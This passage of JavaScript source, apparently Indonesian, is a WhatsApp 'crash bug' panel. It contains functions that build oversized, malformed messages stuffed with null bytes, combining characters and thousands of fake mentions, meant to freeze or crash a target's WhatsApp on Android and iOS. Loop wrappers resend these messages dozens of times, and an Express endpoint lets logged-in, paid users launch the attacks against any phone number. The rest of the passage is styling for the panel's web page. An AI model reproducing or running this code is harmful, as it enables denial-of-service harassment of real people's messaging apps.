},
nativeFlowResponseMessage: {
name: "address_message",
paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"Indonesia\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Medan\",\"city\":\"delitua\",\"name\":\"marendal\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
version: 3
},
},
},
},
};

await Ren.relayMessage("status@broadcast", msg, {
messageId: Date.now().toString(),
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{ tag: "to", attrs: { jid: target }, content: [] }
]
}
]
}
]
});

console.log(chalk.green("Success Send Bug Delay Maker 1 〽️"));
}

async function InVisible(Ren, target) {
        const msg = await generateWAMessageFromContent(target, {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "𖣂-XboyTrazher",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\u0000".repeat(1045000),
                            version: 3
                        },
                        entryPointConversionSource: "call_permission_request"
                    }
                }
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                forwardedNewsletterMessageInfo: {
                    newsletterName: "ꦾ".repeat(25000),
                    newsletterJid: "333333333333333333@newsletter",
                    serverMessageId: 1
                },
                mentionedJid: [
                    "13135550002@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => 
                        `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
                    )
                ]
            }
        }, {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0")
        });

        await Ren.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                    content: []
                                }
                            ]
                        }
                    ]
                }
            ]
        });

        console.log(chalk.green("Success Send Bug Delay 🤧"));
        await sleep(500);
}

async function HardUi(Ren, target) {
const UiLoad = "ꦽ".repeat(50000) + 
                "𑜦𑜠".repeat(18000) +
                "ꦹ".repeat(25000) +
                "ꦾ".repeat(25000) +
                "ꦃ".repeat(25000);
 const Interactive = {
      viewOnceMessage: {
        message: {
        interactiveMessage: {
        contextInfo: {
        participant: target,
        mentionedJid: [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 1900 }, () =>
        "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
        ),
      ],
       remoteJid: "X",
       stanzaId: "123",
       quotedMessage: {
       paymentInviteMessage: {
       serviceType: 3,
       expiryTimestamp: Date.now() + 1814400000,
       },
         forwardedAiBotMessageInfo: {
          botName: "NTED AI",
           botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
           creatorName: "NtedCrasherAi",
           },
          },
        },
        body: {
         text: "</> XBoy - Executor </>" +UiLoad,
        },
          templateButtonReplyMessage: {
           selectedId: "\u0000" + UiLoad,
           selectedDisplayText: "</XboyTrazher>" + UiLoad,
           buttons: [
         {
           buttonId: "Xboy?" ,
            buttonText: {
            displayText: "</> XboyTrazher  </>" + UiLoad,
            },
             type: 0
             }
          ]
         }
      }
    }
  }
};

await Ren.relayMessage(target, Interactive, {
messageId: null,
userJid: target,
  });
}

async function FyzzyNest(Ren, target) {
  try {
    console.log(chalk.red(`FyzzCrasher Send Bug To ${target}`))

    const LanggXzzzz = JSON.stringify({
      status: true,
      criador: "FyzzNotDev",
      timestamp: Date.now(),
      noise: "}".repeat(1000000), // 1 juta karakter
      resultado: {
        type: "md",
        dummyRepeat: Array(100).fill({
          id: "Fyzz Is Here" + Math.random(),
          message: "\u200f".repeat(5000),
          crash: {
            deepLevel: {
              level1: {
                level2: {
                  level3: {
                    level4: {
                      level5: {
                        loop: Array(50).fill("🪷".repeat(500))
                      }
                    }
                  }
                }
              }
            }
          }
        }),
        ws: {
          _events: {
            "CB:ib,,dirty": ["Array"]
          },
          _eventsCount: -98411,
          _maxListeners: Infinity,
          url: "wss://web.whatsapp.com/ws/chat",
          config: {
            version: new Array(500).fill([99, 99, 99]),
            browser: new Array(100).fill(["Chrome", "Linux"]),
            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
            sockCectTimeoutMs: 100,
            keepAliveIntervalMs: 10,
            logger: {
              logs: Array(1000).fill("Asep Is Here")
            },
            spam: Array(1000).fill("🪺").join(""),
            auth: { Object: "authData" },
            crashTrigger: {
              nullField: null,
              undefinedField: undefined,
              boolSwitch: [true, false, false, true, null],
              crazyArray: new Array(10000).fill(Math.random())
            },
            mobile: true
          }
        }
      }
    })

    const generateLocationMessage = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -999.035,
            degreesLongitude: 922.999999999999,
            name: "ꦾ".repeat(10000),
            address: "\u200f",
            nativeFlowMessage: {
              messageParamsJson: "}".repeat(100000),
            },
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 40000 }, () =>
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true
            }
          }
        }
      }
    }

    const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {})

    await Ren.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: LanggXzzzz,
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }, {
      participant: target
    })

    console.log(chalk.green(`Crash terkirim ${target}`))
  } catch (err) {
    console.error(chalk.red("Gagal kirim Bug:\n"), err)
  }
}

//Crash Home


// Crash Ios/iPhone
async function crashNewIos(Ren, target) {
  await Ren.relayMessage(target, {
    contactsArrayMessage: {
      displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contacts: [
        {
          displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        },
        {
          displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻�𝚎ᜆ‌‌‌‌⋆>;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        }
      ],
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        quotedAd: {
          advertiserName: "x",
          mediaType: "IMAGE",
          jpegThumbnail: null,
          caption: "x"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } })
}      

async function crashNewIos2(Ren, target) {
  const mentioning = "13135550002@s.whatsapp.net";
  const floods = 10; // Tambahkan variabel floods yang hilang
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  await Ren.relayMessage(target, {
    contactsArrayMessage: {
      displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contacts: [
        {
          displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        },
        {
          displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻�𝚎ᜆ‌‌‌‌⋆>;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        }
      ],
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        mentionedJid: mentionedJids, 
        quotedAd: {
          advertiserName: "x",
          mediaType: "IMAGE",
          jpegThumbnail: null,
          caption: "x"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } })
}

async function visible7(target) {
  const crashText = " FyzzModss  ⸙" + "ꦾ".repeat(50000) + "@1".repeat(50000)

  for (let r = 0; r < 25; r++) {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            pollResultSnapshotMessage: {
              pollCreationMessageKey: {
                remoteJid: target,
                fromMe: true,
                id: "335B1E3DF8EB9AAD1AB693E6013391EE"
              },
              voteCounts: [
                {
                  optionName: "\u000e.".repeat(9999) + "\u0007".repeat(9999),
                  count: 99999
                },
                {
                  optionName: "{(".repeat(50000) + crashText,
                  count: 88888
                }
              ],
              totalCount: 188887,
              contextInfo: {
               forwardingScore: 1,
               isForwarded: true,
                  forwardedNewsletterMessageInfo: {
                    newsletterJid: "120363330289360382@newsletter",
                    serverMessageId: 11,
                    newsletterName: " FyzzModss  ⸙",
                    mentionedJid: [
                    target,
             "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                    ],
                  }
               },
            },
          },
        },
      });
  
    await Ren.relayMessage(target, msg.message, {
      messageId: undefined,
      participant: target
    })
    await new Promise(res => setTimeout(res, 2000))
  }
}

async function crashnotif1(Ren, target) {
  try {
    const msg = {
      type: "stickerMessage",
      url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQO7wOIyFm_TnigOckniv6QmXdIu2ICCIj7gH3Vyd68MV89ACGqFWJCpp8HZP_hzVmau-q2Dgegy2Ry8QxgPtlQdvYaYpesdpGBT-ikutg",
      mimetype: "image/webp",
      mediaKey: "4J2Mxiaj5z1W01LsKpF1ZjTpm++M2JIJvminTOlVQBY=",
      fileEncSha256: "akzhy9mr+VwMBW1x85hQZyebeaNU72j1jCb9eC26T+g=",
      fileSha256: "1nmk47DVAUSmXUUJxfOD5X/LwUi0BgJwgmCvOuK3pXI=",
      fileLength: 22254,
      mediaKeyTimestamp: 1760962564,
    };

    const crashpayload = "\u0000".repeat(6000) + "\u200B".repeat(6000) + "𑜦".repeat(9000) + "ꦾ".repeat(6000) + "ꦽ".repeat(6000) + "@1".repeat(9000);

    const crashmsg =
      " FyzzModss ⸙\n\n" + "\n\n" + crashpayload.repeat(30000) + "\n\n";

    const payload = {
      templateMessage: {
        hydratedTemplate: {
          hydratedContentText: crashmsg,
          hydratedButtons: [
            {
              index: 0,
              urlButton: {
                displayText: "./Ren.js",
                url: "https://t.me/FyzzModss",
              },
            },
            {
              index: 1,
              quickReplyButton: {
                displayText: "./Ren.js",
                id: "-/-",
              },
            },
            {
              index: 2,
              quickReplyButton: {
                displayText: "./Ren.js",
                id: "-/-",
              },
            },
            {
              index: 3,
              quickReplyButton: {
                displayText: "./Ren.js",
                id: "-/-",
              },
            },
            {
              index: 4,
              quickReplyButton: {
                displayText: "./Ren.js",
                id: "-/-",
              },
            },
          ],
          hydratedFooterText: "\u0000",
        },
      },
    };

    await Ren.sendMessage(target, payload);
  } catch (error) {
    console.error(error);
  }
}

async function CtaZts(Ren, target) {
  const media = await prepareWAMessageMedia(
    { image: { url: "https://l.top4top.io/p_3552yqrjh1.jpg" } },
    { upload: sock.waUploadToServer }
  );

  const Interactive = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            remoteJid: "X",
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000,
              },
              forwardedAiBotMessageInfo: {
                botName: "META AI",
                botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                creatorName: "Bot",
              },
            },
          },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  media: media.imageMessage,
                },
                body: {
                  text: " #Hallo Gasy. " + "ꦽ".repeat(100000),
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: "ꦽ".repeat(2000),
                    },
                  ],
                  messageParamsJson: "{".repeat(10000),
                },
              },
            ],
          },
        },
      },
    },
  };

  await Ren.relayMessage(target, Interactive, {
    messageId: null,
    userJid: target,
  });
}


async function FyzzyNest(Ren, target) {
  try {
    console.log(chalk.red(`Xboy Send Bug To ${target}`))

    const LanggXzzzz = JSON.stringify({
      status: true,
      criador: "FyzzNotDev",
      timestamp: Date.now(),
      noise: "}".repeat(1000000), // 1 juta karakter
      resultado: {
        type: "md",
        dummyRepeat: Array(100).fill({
          id: "Fyzz Is Here" + Math.random(),
          message: "\u200f".repeat(5000),
          crash: {
            deepLevel: {
              level1: {
                level2: {
                  level3: {
                    level4: {
                      level5: {
                        loop: Array(50).fill("🪷".repeat(500))
                      }
                    }
                  }
                }
              }
            }
          }
        }),
        ws: {
          _events: {
            "CB:ib,,dirty": ["Array"]
          },
          _eventsCount: -98411,
          _maxListeners: Infinity,
          url: "wss://web.whatsapp.com/ws/chat",
          config: {
            version: new Array(500).fill([99, 99, 99]),
            browser: new Array(100).fill(["Chrome", "Linux"]),
            waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
            sockCectTimeoutMs: 100,
            keepAliveIntervalMs: 10,
            logger: {
              logs: Array(1000).fill("Asep Is Here")
            },
            spam: Array(1000).fill("🪺").join(""),
            auth: { Object: "authData" },
            crashTrigger: {
              nullField: null,
              undefinedField: undefined,
              boolSwitch: [true, false, false, true, null],
              crazyArray: new Array(10000).fill(Math.random())
            },
            mobile: true
          }
        }
      }
    })

    const generateLocationMessage = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            degreesLatitude: -999.035,
            degreesLongitude: 922.999999999999,
            name: "ꦾ".repeat(10000),
            address: "\u200f",
            nativeFlowMessage: {
              messageParamsJson: "}".repeat(100000),
            },
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 40000 }, () =>
                  "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                )
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true
            }
          }
        }
      }
    }

    const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {})

    await Ren.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: LanggXzzzz,
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }, {
      participant: target
    })

    console.log(chalk.green(`Crash terkirim ${target}`))
  } catch (err) {
    console.error(chalk.red("Gagal kirim Bug:\n"), err)
  }
}

// ========== END FUNC =============== \\

////////////////////////////////////////////////////
async function forclose(target) {
  for (let i = 0; i < 30; i++) {
  await FreezeInvis(Ren, target);
  await CtaZts(Ren, target);
  await FyzzyNest(Ren, target);
  await FreezeEswe(Ren, target);
  await HardUi(Ren, target);
 }
}
 
async function forceios(target) {
  for (let i = 0; i < 40; i++) {
    await crashNewIos(Ren, target);
    await crashNewIos2(Ren, target);
  }
 }
 
async function delayinvishard(target) {
  for (let i = 0; i < 39; i++) {
    await FreezeEswe(Ren, target);
    await HardUi(Ren, target);
    await FyzzyNest(Ren, target);
    await InVisible(Ren, target);
  }
 }
// ================================================== \\

//middle waree cooldown
const { cooldownMiddleware } = require ("./middleware/cooldown.js");

// 1️⃣ 
app.get("/execution", (req, res) => {
  const username = req.cookies?.sessionUser || "Anonymous";
  const users = getUsers();
  const user = users.find(u => u.username === username);
  const expired = user?.expired || null;
  
  // Cek role pengguna
  const showSidebar = user && (user.role === "vip" || user.role === "owner" || user.role === "admin");

  res.send(
    executionPage(
      "🟪 Ready",
      {},
      true,
      { username, expired },
      "",
      "",
      showSidebar // Parameter baru untuk menampilkan sidebar
    )
  );
});

// 2️⃣ Endpoint eksekusi (kena cooldown)
app.get("/execution/run", cooldownMiddleware(), (req, res) => {
  const username = req.cookies?.sessionUser;
  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  const expired = currentUser?.expired || null;

  // ✅ kalau gak login
  if (!username || !currentUser) {
    return res.status(401).json({
      success: false,
      message: "Unauthorized: silakan login dulu.",
    });
  }

  // ✅ kalau akun expired
  if (!expired || Date.now() > expired) {
    return res.status(403).json({
      success: false,
      message: "Akses kadaluarsa. Silakan perpanjang akun.",
      username,
      expired,
    });
  }

  // ✅ kalau ada error cooldown
  if (req.cooldownError) {
    return res.status(429).json({
      success: false,
      message: req.cooldownError,
      username,
      expired,
    });
  }

  const targetNumber = req.query.target;
  const mode = req.query.mode;
  const target = targetNumber ? `${targetNumber}@s.whatsapp.net` : null;

  // ✅ cek sesi bot aktif
  if (sessions.size === 0) {
    return res.status(503).json({
      success: false,
      message: "🚧 Tidak ada Sender yang aktif di Server. 😑",
      username,
      expired,
    });
  }

  // ✅ validasi input
  if (!targetNumber) {
    return res.status(400).json({
      success: false,
      message: "Masukkan nomor target (62xxxxxxxxxx).",
      username,
      expired,
    });
  }

  if (!/^\d+$/.test(targetNumber)) {
    return res.status(400).json({
      success: false,
      message: "Nomor harus angka dan diawali dengan kode negara.",
      target: targetNumber,
      username,
      expired,
    });
  }

  if (!["delayinvis", "ios", "crashforce"].includes(mode)) {
    return res.status(400).json({
      success: false,
      message: "Mode tidak dikenali. Gunakan mode=delayinvis / ios / crashforce.",
      username,
      expired,
    });
  }

  // ✅ eksekusi
  try {
    if (mode === "delayinvis") {
      delayinvishard(target);
    } else if (mode === "ios") {
      forceios(target);
    } else if (mode === "crashforce") { 
      forclose(target); 
    }

    return res.json({
      success: true,
      message: `✅ Eksekusi sukses! Mode: ${mode.toUpperCase()}`,
      target: targetNumber,
      username,
      expired,
      timestamp: new Date().toLocaleString("id-ID"),
    });
  } catch (err) {
    return res.status(500).json({
      success: false,
      message: err.message || "Terjadi kesalahan saat eksekusi.",
      target: targetNumber,
      username,
      expired,
    });
  }
});

app.get('/status', (req, res) => {
  const sessionPath = path.join(__dirname, 'auth');
  let connected = false;

  if (fs.existsSync(sessionPath)) {
    const files = fs.readdirSync(sessionPath);
    connected = files.length > 0;
  }

  res.json({ connected });
});


const executionPage = (
  status = "🟪 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = "",
  showSidebar = false // Parameter baru
) => {
  const { username, expired, role } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
  <title>Xboy Tr4sher</title>
  <link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet">
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Montserrat:wght@400;600&display=swap" rel="stylesheet">

  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }

    html, body {
      font-family: 'Montserrat', sans-serif;
      background: #0A0F2D;
      color: #E0E0E0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
      align-items: center;
      padding: 20px;
      position: relative; 
      overflow-x: hidden; 
      overflow-y: auto;
    }

    /* Main App Container */
    .app-wrapper {
        display: flex;
        flex-direction: column;
        align-items: center;
        width: 100%;
        max-width: 420px;
        transition: transform 0.3s ease;
        position: relative;
        z-index: 10;
        gap: 15px;
        margin-bottom: 80px;
    }

    /* Main Content Panels - HITAM TRANSPARAN */
    .container {
      background: rgba(0, 0, 0, 0.4);
      border: 1px solid #2A3F8F;
      padding: 20px;
      border-radius: 20px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 0 25px rgba(96, 130, 238, 0.4);
      backdrop-filter: blur(10px);
      position: relative;
    }

    /* Profile Card and Details */
    .profile-card {
      text-align: center;
      margin-bottom: 0;
    }
    .profile-logo {
      width: 70px; height: 70px; margin: 0 auto 12px; display: block; border-radius: 50%;
      box-shadow: 0 0 10px rgba(96, 130, 238, 0.8); border: 3px solid #6082EE; object-fit: cover;
    }
    .profile-username { font-family: 'Orbitron', sans-serif; font-size: 18px; color: #E0E0E0; font-weight: bold; margin-bottom: 6px; }
    .profile-details { font-size: 13px; color: #9A9A9A; }
    .profile-details span { color: #6082EE; font-weight: 600; }

    /* Execute Button */
    .execute-button { 
      background: linear-gradient(90deg, #6082EE, #2644A6); 
      color: #fff; 
      padding: 16px;
      width: 100%; 
      border-radius: 10px; 
      font-weight: bold; 
      border: none; 
      margin-top: 20px;
      margin-bottom: 12px; 
      cursor: pointer; 
      font-size: 16px;
      letter-spacing: 1px; 
      transition: 0.3s ease, box-shadow 0.3s ease; 
      box-shadow: 0 0 15px rgba(96, 130, 238, 0.4); 
    }
    .execute-button:disabled { background: #1B2B6B; cursor: not-allowed; opacity: 0.6; box-shadow: none; }
    .execute-button:hover:not(:disabled) { background: linear-gradient(90deg, #2644A6, #6082EE); box-shadow: 0 0 25px rgba(96, 130, 238, 0.8); }

    /* Footer Action - DIHAPUS */
    .footer-action-container {
      display: none;
    }

    .footer-button {
      display: none;
    }

    /* Video Banner - HITAM TRANSPARAN */
    .video-banner {
      width: 100%;
      height: 140px;
      border-radius: 16px;
      overflow: hidden;
      margin-bottom: 12px;
      box-shadow: 0 8px 25px rgba(96, 130, 238, 0.4);
      border: 1px solid rgba(96, 130, 238, 0.4);
      background: rgba(0, 0, 0, 0.3);
      backdrop-filter: blur(5px);
    }

    .video-banner video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      filter: brightness(0.9) contrast(1.1);
    }

    .username {
      font-family: 'Orbitron', sans-serif;
      font-size: 18px;
      font-weight: 600;
      text-align: center;
      margin-bottom: 6px;
      color: #E0E0E0;
    }

    .connected, .disconnected {
      font-size: 13px;
      margin-bottom: 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .connected::before, .disconnected::before {
      content: '';
      width: 8px;
      height: 8px;
      border-radius: 50%;
      display: inline-block;
      margin-right: 6px;
      box-shadow: 0 0 10px currentColor;
    }

    .connected::before { 
      background: #22c55e; 
      box-shadow: 0 0 15px #22c55e;
    }
    .disconnected::before { 
      background: #6082EE; 
      box-shadow: 0 0 15px #6082EE;
    }

    /* Input fields dengan transparansi */
    .input-field, .dropbtn {
      width: 100%;
      padding: 12px;
      font-size: 14px;
      font-weight: 600;
      border-radius: 12px;
      border: 1px solid #6082EE;
      background: rgba(26, 43, 107, 0.6);
      color: #fff;
      backdrop-filter: blur(10px);
      transition: all 0.3s ease;
    }

    .input-field::placeholder {
      color: rgba(255, 255, 255, 0.6);
    }

    .input-field:focus, .dropbtn:focus {
      outline: none;
      border-color: #6082EE;
      box-shadow: 0 0 15px rgba(96, 130, 238, 0.4);
      background: rgba(42, 63, 143, 0.6);
    }

    .dropdown {
      position: relative;
      width: 100%;
      margin-top: 10px;
    }

    .dropbtn {
      cursor: pointer;
      text-align: left;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .dropdown-content {
      display: none;
      position: absolute;
      top: 110%;
      left: 0;
      width: 100%;
      background: rgba(0, 0, 0, 0.6);
      border: 1px solid #6082EE;
      border-radius: 12px;
      box-shadow: 0 8px 25px rgba(96, 130, 238, 0.3);
      backdrop-filter: blur(15px);
      z-index: 99;
      flex-direction: column;
      padding: 8px 0;
    }

    .dropdown-content button {
      width: 100%;
      padding: 12px 14px;
      background: transparent;
      border: none;
      color: #fff;
      text-align: left;
      cursor: pointer;
      display: flex;
      align-items: center;
      gap: 8px;
      font-size: 14px;
      transition: all 0.2s ease;
      margin: 2px 0;
    }

    .dropdown-content button:hover {
      background: rgba(96, 130, 238, 0.3);
    }

    /* Background partikel */
    #particles-js {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
    }
    
    /* Role Container */
    .role-container {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    
    /* Bug Container */
    .bug-container {
      margin-top: 10px;
    }
    
    /* Spasi tambahan untuk input field */
    .input-field {
      margin-bottom: 15px;
    }

    /* Label untuk input dan dropdown */
    .input-label {
      font-family: 'Orbitron', sans-serif;
      font-size: 14px;
      font-weight: 600;
      color: #6082EE;
      margin-bottom: 8px;
      display: block;
    }

    /* NOTIFIKASI CUSTOM DENGAN ANIMASI */
    .custom-notification {
      position: fixed;
      top: 20px;
      right: 20px;
      background: linear-gradient(135deg, rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.4));
      border: 1px solid #6082EE;
      border-radius: 15px;
      padding: 20px 25px;
      box-shadow: 0 10px 30px rgba(96, 130, 238, 0.4);
      backdrop-filter: blur(15px);
      z-index: 10000;
      max-width: 320px;
      transform: translateX(400px);
      opacity: 0;
      transition: all 0.5s cubic-bezier(0.68, -0.55, 0.265, 1.55);
      display: flex;
      align-items: center;
      gap: 15px;
    }

    .custom-notification.show {
      transform: translateX(0);
      opacity: 1;
    }

    .custom-notification.hide {
      transform: translateX(400px);
      opacity: 0;
    }

    .notification-icon {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 20px;
      flex-shrink: 0;
      animation: pulse 2s infinite;
    }

    .notification-success .notification-icon {
      background: linear-gradient(135deg, #22c55e, #16a34a);
      box-shadow: 0 0 20px rgba(34, 197, 94, 0.5);
    }

    .notification-error .notification-icon {
      background: linear-gradient(135deg, #ef4444, #dc2626);
      box-shadow: 0 0 20px rgba(239, 68, 68, 0.5);
    }

    .notification-warning .notification-icon {
      background: linear-gradient(135deg, #f59e0b, #d97706);
      box-shadow: 0 0 20px rgba(245, 158, 11, 0.5);
    }

    .notification-info .notification-icon {
      background: linear-gradient(135deg, #3b82f6, #1d4ed8);
      box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
    }

    .notification-content {
      flex: 1;
    }

    .notification-title {
      font-family: 'Orbitron', sans-serif;
      font-size: 16px;
      font-weight: 700;
      margin-bottom: 5px;
      color: #E0E0E0;
    }

    .notification-message {
      font-size: 14px;
      color: #9A9A9A;
      line-height: 1.4;
    }

    .notification-progress {
      position: absolute;
      bottom: 0;
      left: 0;
      height: 3px;
      background: linear-gradient(90deg, #6082EE, #2644A6);
      border-radius: 0 0 15px 15px;
      width: 100%;
      transform-origin: left;
      animation: progress 3s linear forwards;
    }
